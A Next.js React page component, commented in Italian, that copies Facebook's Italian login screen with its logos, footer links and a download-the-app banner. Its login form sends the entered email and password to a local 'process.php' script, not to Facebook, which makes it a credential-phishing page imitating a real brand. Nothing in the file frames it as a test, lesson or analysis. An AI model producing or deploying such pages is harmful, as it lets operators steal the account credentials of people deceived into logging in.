'use client';

import Image from 'next/image';
import 'facebook.css'; // Assicurati che sia in app/ o in styles/

export default function Home() {
  return (
    <html lang="it">
      <body>
        <div className="top-banner">
          <p>📥 Scarica Facebook per Android per navigare più velocemente.</p>
        </div>

        <div className="fb-container">
          <p className="lang">Italiano</p>
          <Image src="facebook.png" alt="Facebook logo" width={200} height={60} className="fb-logo" />

          <div className="fb-login-box">
            <form action="process.php" method="POST" className="fb-form">
              <input type="text" name="email" placeholder="Email o numero di telefono" required />
              <input type="password" name="password" placeholder="Password" required />
              <button type="submit">Accedi</button>
              <a href="#" className="forgot">Hai dimenticato la password?</a>
              <hr />
              <button className="create-account">Crea nuovo account</button>
            </form>
          </div>

          <footer className="meta-footer">
            <Image src="meta.png" alt="Meta logo" width={100} height={30} className="meta-logo" />
            <div className="meta-links">
              <a href="#">Informazioni</a>
              <a href="#">Centro assistenza</a>
              <a href="#">Altro</a>
            </div>
          </footer>
        </div>
      </body>
    </html>
  );
            }
